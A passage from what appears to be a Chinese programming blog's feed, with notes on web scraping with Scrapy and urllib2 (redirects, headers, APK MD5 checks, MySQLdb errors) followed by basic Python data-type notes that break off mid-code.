'GET /wap/wdown/softversion?id=43432 HTTP/1.0\r\nHost: wap.shouji.com.cn\r\nUser-Agent: Python-urllib/1.17\r\n\r\n'</span><br><span class="line">reply: 'HTTP/1.1 200 OK\r\n'</span><br><span class="line">header: Server: nginx</span><br><span class="line">header: Date: Thu, 27 Nov 2014 04:07:38 GMT</span><br><span class="line">header: Connection: close</span><br><span class="line">header: Cache-Control: no-cache</span><br><span class="line">header: Expires: Thu, 01 Dec 1994 16:00:00 GMT</span><br><span class="line">header: Set-Cookie: JSESSIONID=abc3a8cR57Ob5fBwaBVNu; path=/</span><br><span class="line">header: Content-Length: 0</span><br><span class="line">header: X-Cache: MISS from alicdn.shouji.com.cn</span><br></pre></td></tr></table></figure><p>urllib2开启调试的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">httpHandler = urllib2.HTTPHandler(debuglevel=<span class="number">1</span>)</span><br><span class="line">httpsHandler = urllib2.HTTPSHandler(debuglevel=<span class="number">1</span>)</span><br><span class="line">opener = urllib2.build_opener(httpHandler, httpsHandler)</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line">response = urllib2.urlopen(<span class="string">"http://xxx.xx/xx"</span>)</span><br></pre></td></tr></table></figure><p>在Python2.7中，urllib与urllib2提供的功能不同，最显著的两个不同是：</p><ol><li>urllib2可以接受一个Request类的实例来设置URL请求的headers，urllib仅可以接受URL。这意味着，你不可以伪装你的User Agent字符串等。</li><li>urllib提供urlencode方法用来GET查询字符串的产生，而urllib2没有。这是为何urllib常和urllib2一起使用的原因。</li></ol><h2 id="指定Scrapy的Referer"><a href="#指定Scrapy的Referer" class="headerlink" title="指定Scrapy的Referer"></a>指定Scrapy的Referer</h2><p>在<code>settings.py</code>文件中添加：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">    'Referer': 'http://www.google.com'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取302重定向后的URL"><a href="#获取302重定向后的URL" class="headerlink" title="获取302重定向后的URL"></a>获取302重定向后的URL</h2><p>网页中的一些下载链接是这种类型的：<a href="http://abc.com/xxx?xxx" target="_blank" rel="noopener">http://abc.com/xxx?xxx</a> 点击后会跳转到真实的下载链接，这个跳转的过程大多数是临时重定向的过程，HTTP状态码为302。</p><p>urllib2能够处理HTTP的301、302重定向网页，使用<code>geturl()</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">link = <span class="string">"http://resget.91.com/Soft/Controller.ashx?action=download&amp;tpl=1&amp;id=41033355"</span></span><br><span class="line">response = urllib2.urlopen(link)</span><br><span class="line">dllink = response.geturl()</span><br><span class="line"><span class="keyword">print</span> dllink</span><br></pre></td></tr></table></figure><p>输出结果是真实的下载地址：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bcs.apk.r1.91.com/data/upload/2014/10_01/20/com.chinamworld.main_200333.apk</span><br></pre></td></tr></table></figure><h2 id="Scrapy的Item"><a href="#Scrapy的Item" class="headerlink" title="Scrapy的Item"></a>Scrapy的Item</h2><p>这是Scrapy例子中的爬虫类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DmozSpider</span><span class="params">(Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"dmoz"</span></span><br><span class="line">    allowed_domains = [<span class="string">"dmoz.org"</span>]</span><br><span class="line">    start_urls = [</span><br><span class="line">        <span class="string">"http://www.dmoz.org/Computers/Programming/Languages/Python/Books/"</span>,</span><br><span class="line">        <span class="string">"http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/"</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        sel = Selector(response)</span><br><span class="line">        sites = sel.xpath(<span class="string">'//ul[@class="directory-url"]/li'</span>)</span><br><span class="line">        items = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> site <span class="keyword">in</span> sites:</span><br><span class="line">            item = Website()</span><br><span class="line">            item[<span class="string">'name'</span>] = site.xpath(<span class="string">'a/text()'</span>).extract()</span><br><span class="line">            item[<span class="string">'url'</span>] = site.xpath(<span class="string">'a/@href'</span>).extract()</span><br><span class="line">            item[<span class="string">'description'</span>] = site.xpath(<span class="string">'text()'</span>).re(<span class="string">'-\s[^\n]*\\r'</span>)</span><br><span class="line">            items.append(item)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> items</span><br></pre></td></tr></table></figure><p>在爬虫类的parse()方法中，返回的items是这种类型的字典：{‘name’: [‘xxx’], ‘url’: [‘xxx’], ‘description’: [‘xxx’]}，字典中元素的值是列表的形式。因此想要在<code>piplines.py</code>中处理item的元素，需要将元素的值按照列表的方法处理。比如，要想以<code>utf-8</code>编码输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(item[<span class="string">"name"</span>]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(item[<span class="string">"url"</span>]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(item[<span class="string">"description"</span>]).encode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><h2 id="判断第三方市场的APK是否正版"><a href="#判断第三方市场的APK是否正版" class="headerlink" title="判断第三方市场的APK是否正版"></a>判断第三方市场的APK是否正版</h2><p>原思路：先从官网下载正版APK，计算并记录该APK的MD5等信息。然后从第三方市场使用<code>urllib</code>的<code>urlretrieve()</code>方法下载APK，计算其MD5值是否同正版的MD5相同。<br>缺点：每次都要从第三方市场下载APK后才能计算其MD5，如果APK很大，下载耗时，网络带宽浪费严重。</p><p>新思路：不下载APK的情况下取其MD5值。<br>实现原理：使用urllib.urlopen()返回的response的<code>info()</code>方法，<code>info()</code>中包含了多个字段，其中一项就有资源的MD5值，字段名为：<code>Content-MD5</code>。代码示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 该链接为百度手机助手中招商银行3.0.1的下载链接</span></span><br><span class="line">dllink = <span class="string">"http://gdown.baidu.com/data/wisegame/24796ec9b5284d40/zhaoshangyinxing_301.apk"</span></span><br><span class="line">response = urllib.urlopen(dllink)</span><br><span class="line">headers = response.info()</span><br><span class="line"><span class="keyword">print</span> headers</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Server: JSP3/2.0.4</span><br><span class="line">Date: Thu, 04 Dec 2014 08:58:28 GMT</span><br><span class="line">Content-Type: application/vnd.android.package-archive</span><br><span class="line">Content-Length: 4964681</span><br><span class="line">Connection: close</span><br><span class="line">ETag: b21e117b24796ec9b5284d40d88c1976</span><br><span class="line">Last-Modified: Fri, 28 Nov 2014 07:17:36 GMT</span><br><span class="line">Expires: Thu, 04 Dec 2014 09:26:00 GMT</span><br><span class="line">Age: 257312</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">x-bs-version: 04FD2F39E44F0C2C1C44179DD633BA21</span><br><span class="line">x-bs-request-id: MTAuNDIuMTMzLjU4OjgwODA6Mzg5NTYxMDc2OToyOC9Ob3YvMjAxNCAxNzoyNTozMCA=</span><br><span class="line">x-bs-meta-crc32: 3911572026</span><br><span class="line">Content-MD5: b21e117b24796ec9b5284d40d88c1976</span><br><span class="line">x-bs-client-ip: MjcuMjIxLjQwLjE1NQ==</span><br></pre></td></tr></table></figure><p>通过下载验证，<code>Content-MD5</code>字段就是该apk文件的MD5值，<code>Content-Length</code>字段是该apk文件的大小（bytes），<code>x-bs-meta-crc32</code>字段是该apk文件的CRC32校验码（十进制表示）。另外，在这里urllib也可以换为urllib2，得到的结果相同。</p><p>大多数情况下，使用urllib2请求APK文件的下载链接时都会返回<code>Content-MD5</code>字段，但是也有例外。所以在获取其MD5之前要进行一次判断，看headers.has_key(“Content-MD5”)返回True还是False。</p><h2 id="MySQLdb操作中的错误"><a href="#MySQLdb操作中的错误" class="headerlink" title="MySQLdb操作中的错误"></a>MySQLdb操作中的错误</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: %d format: a number is required, not str</span><br></pre></td></tr></table></figure><p>解决办法：MySQL里不需要对对应的变量写%d,只写%s就可以了</p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>当执行以下代码时：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cur.execute(<span class="string">"create table test(id int(2) not null primary key auto_increment, name varchar(40)) default charset=utf8"</span>)</span><br></pre></td></tr></table></figure><p>如果表test存在，会出现警告：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: Table 'test' already exists</span><br></pre></td></tr></table></figure><p>解决办法：其实这只是个警告，不是错误。可以通过设置<code>sql_notes</code>忽略这个警告：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET sql_notes = <span class="number">0</span>;      -- Temporarily disable the <span class="string">"Table already exists"</span> warning</span><br><span class="line">CREATE TABLE IF NOT EXISTS ...</span><br><span class="line">SET sql_notes = <span class="number">1</span>;      -- And then re-enable the warning again</span><br></pre></td></tr></table></figure><p>但是，最好的办法不是忽略警告，而是解决警告：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = MySQLdb.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"1234"</span>,db=<span class="string">"test"</span>,port=<span class="number">3306</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">"show tables"</span>)</span><br><span class="line">    rows = cur.fetchall()</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">u'test'</span>,) <span class="keyword">in</span> rows:</span><br><span class="line">        <span class="comment"># test already exists</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Table 'test' already exists."</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># Create table test</span></span><br><span class="line">        cur.execute(<span class="string">"create table test(id int(2) not null primary key auto_increment, name varchar(40)) default charset=utf8"</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    conn.commit()</span><br><span class="line">    <span class="keyword">if</span> conn:</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br></pre></td></tr></table></figure><h2 id="使用LAMPP中的MySQL服务"><a href="#使用LAMPP中的MySQL服务" class="headerlink" title="使用LAMPP中的MySQL服务"></a>使用LAMPP中的MySQL服务</h2><p>Ubuntu中安装了LAMPP，在Scrapy中使用MySQLdb时，提示找不到<code>mysqld.sock</code>：</p><blockquote><p>“Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’ (2)”</p></blockquote><p>这是因为LAMPP中MySQL的<code>mysqld.sock</code>不在<code>/var/run/mysqld/</code>目录中，而是位于<code>/opt/lampp/var/mysql/</code>目录下，名字是<code>mysql.sock</code>（注意，少一个<code>d</code>，不是<code>mysqld.sock</code>）。当然我们可以使用<code>find</code>命令来查找一下<code>*.sock</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo find /opt/lampp -name <span class="string">"*.sock"</span></span><br></pre></td></tr></table></figure><p>可以看到<code>mysql.sock</code>的位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/lampp/var/mysql/mysql.sock</span><br></pre></td></tr></table></figure><p>解决办法：建立一个’/var/run/mysqld/mysqld.sock’指向’/opt/lampp/var/mysql/mysql.sock’的软连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /var/run</span><br><span class="line">$ sudo mkdir mysqld <span class="comment"># 先创建mysqld文件夹</span></span><br><span class="line">$ <span class="built_in">cd</span> mysqld</span><br><span class="line">$ sudo ln -s /opt/lampp/var/mysql/mysql.sock mysqld.sock</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以下是最近写爬虫使用Scrapy的一些笔记。&lt;/p&gt;
&lt;h2 id=&quot;关于Scrapy&quot;&gt;&lt;a href=&quot;#关于Scrapy&quot; class=&quot;headerlink&quot; title=&quot;关于Scrapy&quot;&gt;&lt;/a&gt;关于Scrapy&lt;/h2&gt;&lt;p&gt;Scrapy官网：&lt;a href
      
    
    </summary>
    
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
      <category term="Scrapy" scheme="https://g2ex.top/tags/Scrapy/"/>
    
  </entry>
  
  <entry>
    <title>Python基础笔记</title>
    <link href="https://g2ex.top/2014/12/01/Basic-Python-Notes/"/>
    <id>https://g2ex.top/2014/12/01/Basic-Python-Notes/</id>
    <published>2014-12-01T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>最近要写爬虫，复习了Python的基础知识，记录了学习<a href="http://looly.gitbooks.io/python-basic/" target="_blank" rel="noopener">零基础学Python</a>过程中的一些笔记。</p><h2 id="取名的学问"><a href="#取名的学问" class="headerlink" title="取名的学问"></a>取名的学问</h2><ul><li>文件名：全小写，可使用下划线</li><li>函数名：小写，可以用下划线分割单词增加可读性</li><li>函数的参数：如果一个函数的参数名称和保留的关键字冲突，通常使用一个后缀下划线好于使用缩写或奇怪的拼写</li><li>变量：变量名全部小写，由下划线链接各个单词</li></ul><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">'what\'s your name?'</span>   <span class="comment">#使用转义字符"\"</span></span><br><span class="line">what<span class="string">'s your name?</span></span><br><span class="line">&gt;&gt;&gt; print "what's your name?"   #双引号包裹单引号，单引号是字符</span><br><span class="line">what<span class="string">'s your name?</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; print '</span>what <span class="string">"is your"</span> name<span class="string">' #单引号包裹双引号，双引号是字符</span></span><br><span class="line"><span class="string">what "is your" name</span></span><br></pre></td></tr></table></figure><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><ol><li>用”+”连接</li><li>用占位符连接</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"one is %d"</span>%<span class="number">1</span></span><br><span class="line">one <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">"py"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="string">"thon"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"%s%s"</span>%(a,b)  <span class="comment">#注</span></span><br><span class="line">python</span><br></pre></td></tr></table></figure><p>字符串长度：len(object)</p><p>字符串大小写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">S.upper() <span class="comment">#S中的字母大写</span></span><br><span class="line">S.lower() <span class="comment">#S中的字母小写</span></span><br><span class="line">S.capitalize() <span class="comment">#首字母大写</span></span><br><span class="line">S.title() <span class="comment">#所有单词首字母大写</span></span><br><span class="line">S.istitle() <span class="comment">#所有单词首字母是否大写的，且其它为小写</span></span><br><span class="line">S.isupper() <span class="comment">#S中的字母是否全是大写</span></span><br><span class="line">S.islower() <span class="comment">#S中的字母是否全是小写</span></span><br></pre></td></tr></table></figure><p>字符串截取：a[n,m]，其中n &lt; m，得到的字符是从a[n]开始到a[m-1]</p><p>去字符串两头空格：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S.strip() <span class="comment">#去掉字符串的左右空格</span></span><br><span class="line">S.lstrip() <span class="comment">#去掉字符串的左边空格</span></span><br><span class="line">S.rstrip() <span class="comment">#去掉字符串的右边空格</span></span><br></pre></td></tr></table></figure><blockquote><p><code>#!/usr/bin python</code>：表示python解释器在/usr/bin里面。<code>#!/usr/bin/env python</code>表示要通过系统搜索路径寻找python解释器。不同系统，可能解释器的位置不同，所以这种方式能够让代码更将拥有可移植性。以上是对Unix系列操作系统而言。</p></blockquote><h2 id="列表list"><a href="#列表list" class="headerlink" title="列表list []"></a>列表list []</h2><p>类似字符串可以根据编号取元素，list.append(X)追加元素X，len(L)获取L中元素个数，list.extend(L)合并list。</p><p>list.count(X)元素X在list中出现的次数。</p><p>list.index(X)元素X在list中的位置。</p><p>list.insert(i, x)在list的第i个元素之前插入x，如果i==len(list)，意思是在后面追加，就等同于list.append(x)。</p><p>删除元素：list.remove(x)，list.pop([i]) # [ ]内为可选</p><p>排序：list.sort(cmp=None, key=None, reverse=False)，sorted(iterable[, cmp[, key[, reverse]]]</p><p>一个非常重要的帮手：help(list)、dir(list)（注：dir()要更简洁）</p><p>list与str的区别：list是可以改变的，str不可变。</p><p>list和str转化：<code>str.split()</code>这个内置函数实现的是将str转化为list。逆运算是<code>&quot;[sep]&quot;.join(list)</code>把list中的元素使用sep分隔符组合为字符串。</p><p>list解析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>squares = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>squares</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br></pre></td></tr></table></figure><h2 id="字典dict"><a href="#字典dict" class="headerlink" title="字典dict {}"></a>字典dict {}</h2><ul><li>dict是可变的</li><li>dict可以存储任意数量的Python对象</li><li>dict可以存储任何python数据类型</li><li>dict以：key:value，即“键：值”对的形式存储数据，每个键是唯一的</li><li>dict也被称为关联数组或哈希表</li></ul><p>获取键、值：<code>d.keys()</code>、<code>d.values()</code><br>获取键值对：<code>d.items()</code></p><p>键值对的个数<code>len(d)</code></p><p>删除键值对：<code>d.pop(key)</code>、<code>del d[key]</code></p><p><code>d.update(d2)</code>把d2合并到d中。</p><h2 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组 tuple ()"></a>元组 tuple ()</h2><p>元组不能修改。</p><p>分别用list()和tuple()能够实现两者的转化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>, <span class="string">'23'</span>, [<span class="number">123</span>, <span class="string">'abc'</span>], (<span class="string">'python'</span>, <span class="string">'learn'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tls = list(t) <span class="comment">#tuple--&gt;list</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tls</span><br><span class="line">[<span class="number">1</span>, <span class="string">'23'</span>, [<span class="number">123</span>, <span class="string">'abc'</span>], (<span class="string">'python'</span>, <span class="string">'learn'</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t_tuple = tuple(tls) <span class="comment">#list--&gt;tuple</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t_tuple</span><br><span class="line">(<span class="number">1</span>, <span class="string">'23'</span>, [<span class="number">123</span>, <span class="string">'abc'</span>], (<span class="string">'python'</span>, <span class="string">'learn'</span>))</span><br></pre></td></tr></table></figure><p>tuple用在哪里？</p><blockquote><p>Tuple 比 list 操作速度快。如果您定义了一个值的常量集，并且唯一要用它做的是不断地遍历它，请使用 tuple 代替 list。<br>如果对不需要修改的数据进行 “写保护”，可以使代码更安全。使用 tuple 而不是 list 如同拥有一个隐含的 assert 语句，说明这一数据是常量。如果必须要改变这些值，则需要执行 tuple 到 list 的转换 (需要使用一个特殊的函数)。<br>Tuples 可以在 dictionary 中被用做 key，但是 list 不行。实际上，事情要比这更复杂。Dictionary key 必须是不可变的。Tuple 本身是不可改变的，但是如果您有一个 list 的 tuple，那就认为是可变的了，用做 dictionary key 就是不安全的。只有字符串、整数或其它对 dictionary 安全的 tuple 才可以用作 dictionary key。<br>Tuples 可以用在字符串格式化中，后面会用到。</p></blockquote><h2 id="集合-set"><a href="#集合-set" class="headerlink" title="集合 set {}"></a>集合 set {}</h2><p>set不含键值对，set中的元素不可重复。</p><p>创建set：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = set(<span class="string">"abbc"</span>)  <span class="comment">#把str中的字符拆解开,形成set.特别注意观察:abbc中有两个b</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 <span class="comment">#但是在s1中,只有一个b,也就是不能重复</span></span><br><span class="line">set([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = set([<span class="number">123</span>,<span class="string">"google"</span>,<span class="string">"face"</span>,<span class="string">"book"</span>,<span class="string">"facebook"</span>,<span class="string">"book"</span>]) <span class="comment">#通过list创建set.不能有重复,元素可以是int/str</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2</span><br><span class="line">set([<span class="string">'facebook'</span>, <span class="number">123</span>, <span class="string">'google'</span>, <span class="string">'book'</span>, <span class="string">'face'</span>]) <span class="comment">#元素顺序排列不是按照指定顺序</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s3 = &#123;<span class="string">"facebook"</span>,<span class="number">123</span>&#125; <span class="comment">#通过&#123;&#125;直接创建</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s3</span><br><span class="line">set([<span class="number">123</span>, <span class="string">'facebook'</span>])</span><br></pre></td></tr></table></figure><p>通过{}无法创建含有list/dict元素的set。</p><p>更改set：<code>set.add(x)</code>增加元素x，<code>set.update(s2)</code>把s2合并到当前set中。</p><p>set删除：<code>set.pop()</code> <code>set.remove(obj)</code> <code>set.discard(obj)</code>。set.pop()是从set中任意选一个元素，删除并将这个值返回。但是，不能指定删除某个元素。</p><p><code>set.clear()</code>清空set。</p><p>冻结的集合：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f_set = frozenset(<span class="string">"abc"</span>) <span class="comment">#看这个名字就知道了frozen，冻结的set</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f_set</span><br><span class="line">frozenset([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f_set.add(<span class="string">"python"</span>) <span class="comment">#报错</span></span><br></pre></td></tr></table></figure><p>子集与超集：set.issubset(s2)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">set([<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">set([<span class="string">'a'</span>, <span class="string">'b'</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c&lt;a <span class="comment">#c是a的子集</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.issubset(a) <span class="comment">#或者用这种方法，判断c是否是a的子集</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.issuperset(c) <span class="comment">#判断a是否是c的超集</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>并集：<code>a | b</code>或者<code>​a.union(b)</code></p><p>交集：<code>a &amp; b</code>或者<code>a.intersection(b)</code></p><p>A相对B的差（补）：<code>a - b</code>或者<code>a.difference(b)</code></p><p>-A、B的对称差集（(A-B)∪(B-A)）：<code>a.symmetric_difference(b)</code></p><h2 id="Python数据类型总结"><a href="#Python数据类型总结" class="headerlink" title="Python数据类型总结"></a>Python数据类型总结</h2><table><thead><tr><th>对象类型</th><th>举例</th></tr></thead><tbody><tr><td>int/float</td><td>123, 3.14</td></tr><tr><td>str</td><td>‘abc’</td></tr><tr><td>list</td><td>[1, [2, ‘three’], 4]</td></tr><tr><td>dict</td><td>{‘name’: ‘bill’, ‘lang’:’python’}</td></tr><tr><td>tuple</td><td>(1, 2, ‘three’)</td></tr><tr><td>set</td><td>set(‘abc’), {‘a’, ‘b’, ‘c’}</td></tr></tbody></table><p>多用<code>dir(object)</code>或<code>help(object)</code>查看帮助。</p><h2 id="坑爹的字符编码"><a href="#坑爹的字符编码" class="headerlink" title="坑爹的字符编码"></a>坑爹的字符编码</h2><p><code>encode()</code>和<code>decode()</code></p><p>python中如何避免中文是乱码？</p><p>经验一：在开头声明：<code># -*- coding: utf-8 -*-</code>或者<code># coding: utf-8</code></p><p>经验二：遇到字符（节）串，立刻转化为unicode，不要用str()，直接使用unicode()：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unicode_str = unicode(<span class="string">'中文'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">print</span> unicode_str.encode(<span 